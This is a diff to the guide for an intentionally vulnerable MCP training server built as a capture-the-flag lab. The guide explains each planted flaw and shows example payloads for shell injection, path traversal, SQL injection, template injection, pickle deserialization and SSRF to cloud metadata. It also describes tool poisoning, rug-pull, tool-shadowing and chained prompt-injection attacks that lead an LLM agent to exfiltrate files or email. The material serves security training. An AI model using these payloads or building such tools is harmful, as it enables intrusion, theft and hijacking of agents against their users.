@@ -5,6 +5,13 @@ This guide covers every operational aspect of the server. For the game-style wal
 
 ---
 
+> **TL;DR**
+> - Start: `MCP_TRAINING_MODE=true MCP_TRANSPORT=sse python server.py`
+> - Connect: `http://localhost:8000/sse`
+> - First call: `list_challenges()`
+
+---
+
 ## Table of Contents
 
 1. [Starting the Server](#1-starting-the-server)
@@ -26,13 +33,15 @@ This guide covers every operational aspect of the server. For the game-style wal
 
 ## 1. Starting the Server
 
+Two ways to run. Pick the one that fits your workflow.
+
 ### Minimum viable start
 
 ```bash
 MCP_TRAINING_MODE=true python server.py
 ```
 
-This starts the server in stdio mode. It reads from stdin and writes to stdout — the MCP protocol. You won't see output unless a client connects.
+This starts in stdio mode — reads from stdin, writes to stdout. You won't see output unless a client connects.
 
 ### Verify it works before connecting a client
 
@@ -101,7 +110,7 @@ Restart Claude Desktop. You'll see tool icons appear in the chat interface.
 ```
 list_challenges()
 ```
-Should return a formatted list of all 12 challenges.
+Should return a formatted list of all 18 challenges.
 
 ### Cursor
 
@@ -153,7 +162,7 @@ asyncio.run(run_exploit())
 
 ### `list_challenges()`
 
-Returns all challenges with metadata. No arguments.
+Returns all 18 challenges with metadata. No arguments.
 
 ```
 list_challenges()
@@ -219,6 +228,8 @@ submit_flag("BEGINNER-002", "FLAG{wrong}")
 
 ## 4. Working with Vulnerabilities
 
+Here's the full catalog of vulnerable tools, organized by attack class.
+
 ### Tool Poisoning Tools
 
 These tools have adversarial content in their descriptions. To see it:
@@ -245,6 +256,8 @@ for tool in result.tools:
 
 Executes shell commands. Intentionally uses `shell=True`.
 
+> **What's actually broken:** User input is passed directly to `subprocess.run(cmd, shell=True)`. Any shell metacharacter (`;`, `&&`, `|`, backtick, `$()`) lets you append arbitrary commands.
+
 ```
 run_command("ls -la")                      # Normal
 run_command("ls -la; cat /etc/hosts")      # Injection detected → flag
@@ -255,6 +268,8 @@ run_command("ls | grep python")            # Pipe injection → flag
 **`read_file(path: str)`**
 
 Reads files without path normalization.
+
+> **What's actually broken:** The path is passed directly to `open(path)` with no `resolve()` or base directory check. `../` sequences escape the intended directory entirely.
 
 ```
 read_file("README.md")                     # Normal
@@ -267,6 +282,8 @@ read_file("/etc/shadow")                   # Absolute path attack
 
 SQL query built as f-string.
 
+> **What's actually broken:** The query is `f"SELECT * FROM users WHERE username = '{username}'"`. A single quote in the username breaks out of the string context, letting you rewrite the entire WHERE clause.
+
 ```
 query_users("alice")                       # Normal query
 query_users("' OR '1'='1")               # Tautology → all rows
@@ -277,6 +294,8 @@ query_users("'; DROP TABLE users; --")    # Destructive (sandboxed)
 **`render_template(template: str)`**
 
 Jinja2 template rendering without sandboxing.
+
+> **What's actually broken:** Uses `jinja2.Environment` (not `jinja2.sandbox.SandboxedEnvironment`). User-supplied templates have access to Python's full object model via `__class__`, `__mro__`, and `__subclasses__()`.
 
 ```
 render_template("Hello {{ name }}")                    # Normal
@@ -289,6 +308,8 @@ render_template("{{ ''.__class__.__mro__[1].__subclasses__() }}")  # Flag
 **`create_report(data: str)`**
 
 Deserializes base64-encoded pickle data.
+
+> **What's actually broken:** Calls `pickle.loads()` on user-supplied input. Pickle is not just a data format — it's executable bytecode. The `__reduce__` method tells Python what to run on deserialization.
 
 ```python
 # Craft a safe test payload
@@ -312,9 +333,13 @@ evil = base64.b64encode(pickle.dumps(Exploit())).decode()
 
 **`get_admin_config()`** — Should require admin role. Doesn't check.
 
+> **What's actually broken (INTERMEDIATE-001):** There's a `# TODO: check auth` comment where the authorization check should be. The check was never implemented.
+
 **`initialize_server()`** — Sets internal `_initialized` flag to True.
 
 **`reset_all_data()`** — Should require initialization. Doesn't check.
+
+> **What's actually broken (INTERMEDIATE-004):** The `_initialized` flag exists and is set correctly by `initialize_server()` — it's just never read before executing the destructive operation.
 
 **Exploit sequence for INTERMEDIATE-001:**
 ```
@@ -332,6 +357,8 @@ reset_all_data()            # Should fail — doesn't → flag returned
 
 **`send_ai_message(message: str)`** — Inspect description for embedded API keys.
 
+> **What's actually broken (INTERMEDIATE-003):** A fake API key was hardcoded into the tool description by the developer. That description goes to every MCP client that connects via `tools/list`.
+
 **`get_env_var(name: str)`** — Returns any environment variable by name. No allowlist.
 
 **`list_env_vars()`** — Dumps all environment variables.
@@ -346,6 +373,8 @@ list_env_vars()                        # Full environment dump → flag
 
 **`fetch_url(url: str)`** — Fetches any URL, returns content verbatim.
 
+> **What's actually broken:** Two issues in one tool. (1) External content is returned verbatim into LLM context — adversarial pages can inject instructions. (2) No URL allowlist or IP range blocking — the server will fetch internal endpoints including cloud metadata services.
+
 ```
 fetch_url("https://example.com")                          # Normal
 fetch_url("http://attacker.example.com/inject")          # Prompt injection payload
@@ -358,6 +387,8 @@ fetch_url("http://attacker-server/meta")                 # Docker demo: attacker
 
 **`fibonacci(n: int)`** — Exponential recursion. O(2^n) time complexity.
 
+> **What's actually broken:** No upper bound on `n`. No timeout. No memoization. Each increment of `n` doubles the work.
+
 ```
 fibonacci(10)    # Fast (~1ms)
 fibonacci(35)    # Slow (~10s)
@@ -365,6 +396,8 @@ fibonacci(45)    # Sandbox: flag + educational message
 ```
 
 **`generate_permutations(s: str)`** — Factorial blowup. n! permutations.
+
+> **What's actually broken:** No length check on input string. For `n` characters: 10 chars = 3.6M permutations, 12 chars = 479M permutations.
 
 ```
 generate_permutations("abc")            # 6 permutations — fine
@@ -379,11 +412,83 @@ flood_requests("http://example.com", 10)       # Fine
 flood_requests("http://example.com", 100000)   # Sandbox: flag
 ```
 
+### Rug Pull Tools
+
+**`analyse_repo(path: str)`** — Appears to be a security scanner.
+
+> **What's actually broken (RUG-001):** The tool's behavior mutates after the first invocation. Your MCP client cached the benign description from `tools/list`. The actual behavior on the second call is data exfiltration to an attacker endpoint. Your client still shows "security scanner."
+
+```
+analyse_repo("/tmp/demo")   # First call — benign response
+analyse_repo("/tmp/demo")   # Second call — mutation revealed → flag
+```
+
+**`get_compliance_report(standard: str)`** — Appears to check compliance status.
+
+> **What's actually broken (RUG-002):** Behavior is benign within a short time window (matching the period when automated scanners run). After the window expires, the tool switches to credential harvesting. Scanners mark it safe and move on before the mutation activates.
+
+```
+get_compliance_report("SOC2")   # Clean response (within window)
+# wait 10 seconds
+get_compliance_report("SOC2")   # Mutated behavior → flag
+```
+
+### Tool Shadowing Tools
+
+**`send_email(to: str, subject: str, body: str)`** — Appears to send email.
+
+> **What's actually broken (SHADOW-001):** This server registered `send_email` — the same name as a legitimate email server's tool. When both servers are active in the same MCP session, the LLM cannot distinguish them. Email is silently redirected to an attacker endpoint.
+
+```
+send_email(to="colleague@example.com", subject="Q4 Budget", body="See attached")
+# → Reveals shadow mechanism + attacker endpoint + flag
+```
+
+**`search_and_summarise(query: str)`** — Appears to search documents.
+
+> **What's actually broken (SHADOW-002):** The tool description contains a cross-server instruction telling the LLM to call `read_file('/etc/passwd')` from a trusted filesystem server as part of the search workflow. The user asked for a document search. The attacker receives sensitive files.
+
+```
+search_and_summarise("annual report")   # Cross-origin instruction revealed → flag
+```
+
+### OAuth Tools
+
+**`get_oauth_metadata()`** — Returns the server's OAuth discovery document.
+
+> **What's actually broken (OAUTH-001):** The `authorization_endpoint` field contains shell metacharacters (`$()`). When `mcp-remote` (≤0.1.15) interpolates this URL into `exec(\`open '${authorizationEndpoint}'\`)`, the injected subshell executes on the client machine.
+
+**`initiate_oauth_flow(client_id: str)`** — Simulates what `mcp-remote` does with the metadata.
+
+```
+get_oauth_metadata()                    # See the poisoned authorization_endpoint
+initiate_oauth_flow("my-mcp-client")   # Simulate mcp-remote's exec → flag
+```
+
+### Multi-Vector Tools
+
+**`fetch_advisory(url: str)`** — Fetches a security advisory URL.
+
+**`forward_report(to: str, content: str)`** — Forwards a report (shadowed).
+
+**`verify_advisory_source(url: str)`** — Verifies an advisory's origin (SSRF).
+
+> **What's actually broken (MULTI-001):** Three vulnerabilities chain together. `fetch_advisory` returns a prompt-injected advisory that instructs the LLM to call `forward_report`. That tool is shadowed — reports go to the attacker, not the intended relay. `verify_advisory_source` has no SSRF protection and reaches the cloud metadata endpoint. The flag only appears when all three steps complete.
+
+```
+fetch_advisory("https://advisories.example.com/CVE-2026-1337")
+# → Follow the injected instruction in the advisory
+forward_report("security-team@company.com", "<advisory text>")
+# → Shadow revealed — report exfiltrated
+verify_advisory_source("https://advisories.example.com/CVE-2026-1337")
+# → SSRF to 169.254.169.254 → full chain flag
+```
+
 ---
 
 ## 5. MCP Resources
 
-Resources are MCP's equivalent of read-only data endpoints. They're accessible via `resources/read` in the protocol. Some clients (like MCP Inspector) show them in a separate panel.
+Resources are MCP's equivalent of read-only data endpoints. Accessible via `resources/read` in the protocol. Some clients (like MCP Inspector) show them in a separate panel.
 
 Available resources:
 
@@ -575,7 +680,7 @@ asyncio.run(main())
 
 ## 9. Adding Your Own Challenge
 
-Use this pattern to contribute a new vulnerability:
+Use this pattern to contribute a new vulnerability. For the full guide, see [docs/CONTRIBUTING.md](CONTRIBUTING.md).
 
 ### Step 1 — Create the vulnerability module
 
@@ -717,6 +822,8 @@ Expected findings (8+ of these should appear):
 - `list_env_vars` — excessive data exposure
 - `render_template` — template injection
 
+Note: rug pull evasion (RUG-002) and timed behavioral mutations are not currently detectable by point-in-time scanners by design.
+
 ### Interpreting scanner output
 
 ```json
@@ -747,6 +854,8 @@ diff baseline.json new_scan.json
 ---
 
 ## 11. Testing
+
+Don't worry if you've never written a test before — the test suite documents how every attack works. Reading the tests is a great way to understand the vulnerabilities. Each test class shows you exactly what input triggers the attack and what the server returns.
 
 Tests don't require a running server. The `ToolCapture` helper in `tests/helpers.py` intercepts `@app.tool()` registrations so every vulnerability module can be called as plain Python — no network, no subprocess.
 
@@ -793,10 +902,14 @@ Filter by marker: `pytest -m sandbox`
 | `tests/test_beginner.py` | BEGINNER-001 through BEGINNER-004 |
 | `tests/test_intermediate.py` | INTERMEDIATE-001 through INTERMEDIATE-004 |
 | `tests/test_advanced.py` | ADVANCED-001 through ADVANCED-004 |
+| `tests/test_rug_pull.py` | RUG-001 and RUG-002 |
+| `tests/test_tool_shadowing.py` | SHADOW-001 and SHADOW-002 |
+| `tests/test_oauth.py` | OAUTH-001 |
+| `tests/test_multi_vector.py` | MULTI-001 |
 | `tests/test_sandbox.py` | Sandbox intercepts every attack category |
 | `tests/test_ctf_system.py` | YAML challenge definitions, flag submission, hints |
 | `tests/test_resources.py` | Sensitive MCP resources expose expected data |
-| `tests/test_flags.py` | 12 flags present, correct format, uniqueness |
+| `tests/test_flags.py` | 18 flags present, correct format, uniqueness |
 | `tests/test_modules.py` | Module contracts: base class, metadata, register() |
 | `tests/test_config.py` | Training mode gate, env var parsing |
 | `tests/scanner_compat/` | mcp-scan integration (skipped if not installed) |
@@ -885,7 +998,7 @@ These limits make `MCP_SANDBOX=false` safe inside Docker — DoS attacks exhaust
 
 ## 13. Environment Variable Reference
 
-Complete reference for every env var the server reads:
+These control what the server does. Most you'll never need to change — `MCP_TRAINING_MODE=true` and `MCP_TRANSPORT=sse` cover 90% of use cases.
 
 ```bash
 # REQUIRED
@@ -915,7 +1028,7 @@ Environment variables override defaults. There is no config file — all configu
 
 ## 14. Running the Test Suite
 
-The test suite has **346 tests** covering all 12 vulnerability challenges, the CTF system, sandbox enforcement, module contracts, and MCP resources. Tests use [pytest](https://docs.pytest.org/) with [pytest-asyncio](https://pytest-asyncio.readthedocs.io/).
+The test suite has **515 tests** covering all 18 vulnerability challenges, the CTF system, sandbox enforcement, module contracts, and MCP resources. Tests use [pytest](https://docs.pytest.org/) with [pytest-asyncio](https://pytest-asyncio.readthedocs.io/).
 
 ### Install test dependencies
 
@@ -958,11 +1071,15 @@ MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest tests/ --cov=. --cov-re
 | File | What it covers |
 |------|---------------|
 | `tests/test_config.py` | Training mode gate, env var parsing, fake secret prefixes |
-| `tests/test_flags.py` | 12 flags present, correct format, uniqueness, submit_flag() |
+| `tests/test_flags.py` | 18 flags present, correct format, uniqueness, submit_flag() |
 | `tests/test_modules.py` | Module contracts: base class, metadata fields, register() |
 | `tests/test_beginner.py` | BEGINNER-001 through BEGINNER-004 exploitability |
 | `tests/test_intermediate.py` | INTERMEDIATE-001 through INTERMEDIATE-004 exploitability |
 | `tests/test_advanced.py` | ADVANCED-001 through ADVANCED-004 exploitability |
+| `tests/test_rug_pull.py` | RUG-001 and RUG-002 exploitability |
+| `tests/test_tool_shadowing.py` | SHADOW-001 and SHADOW-002 exploitability |
+| `tests/test_oauth.py` | OAUTH-001 exploitability |
+| `tests/test_multi_vector.py` | MULTI-001 full chain |
 | `tests/test_sandbox.py` | Sandbox intercepts every attack category |
 | `tests/test_ctf_system.py` | YAML challenge definitions, flag submission, hints |
 | `tests/test_resources.py` | Sensitive MCP resources expose expected data |
